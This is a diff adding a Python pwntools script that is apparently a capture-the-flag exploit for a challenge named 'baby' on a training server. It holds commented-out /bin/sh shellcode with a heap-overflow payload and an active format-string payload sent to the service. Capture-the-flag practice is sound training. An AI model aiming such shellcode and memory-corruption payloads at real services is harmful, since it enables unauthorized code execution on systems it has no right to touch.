@@ -1,0 +1,73 @@
+
+from pwn import *
+"""===============    Configuration    ================"""
+pwnName = "baby"
+local = True
+libName = 'libc.so'
+host, port = 'ctf.hackucf.org', 9006
+context.endian = 'little'
+context.arch = 'i386'
+context.os = "linux"
+context.log_level = "ERROR"
+context.terminal = ['tmux', 'splitw', '-h']
+print "\n\n" + "="*60 + '\n'
+"""===================================================="""
+if local:
+    r = remote("localhost", 1337)
+else:
+    r = remote(host, port)
+
+
+def sendOption(opt):
+    if r.can_recv():
+       print r.recv(1000) + str(opt)
+    r.sendline(str(opt))
+
+def heapMenu(choice,chunk=None, chunkSize=None, data=None):
+    alloc = None
+    print r.recv(200)
+    r.sendline(str(choice))
+    if chunk != None:
+        print r.recv(500) + str(chunk)
+        r.sendline(str(chunk))
+    else:
+        print r.recv(5000)
+
+    if chunkSize != None:
+        print r.recv(5000) + str(chunkSize)
+        r.sendline(str(chunkSize))
+        if data != None:
+            print data
+            r.sendline(str(data))
+            print r.recv(1000)
+        else:
+            print r.recvuntil('@')
+            alloc = int(r.recvline().strip(), 16)
+    else:
+        if choice == 5:
+            return
+    if choice ==1:
+        return alloc
+
+
+def strMenu(attack):
+    print r.recv(1000)
+    r.sendline(attack)
+    print r.recvline()
+    r.sendline()
+    print r.recv()
+if __name__ == "__main__":
+   # sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+ #   sendOption(3)
+  #  alloc1 = heapMenu(1,1, len(sc))
+   # alloc2 = heapMenu(1,2, len(sc))
+    #spaceBtwn = alloc2 - alloc1
+    #payload = 'a'*spaceBtwn + sc
+    #heapMenu(3, 1, len(sc), sc)
+    #heapMenu(2,1)
+    #heapMenu(5)
+    sendOption(2)
+    strLoad = "%s"*100
+    strMenu(strLoad)
+    #sendOption(3)
+#    heapMenu(2,1)
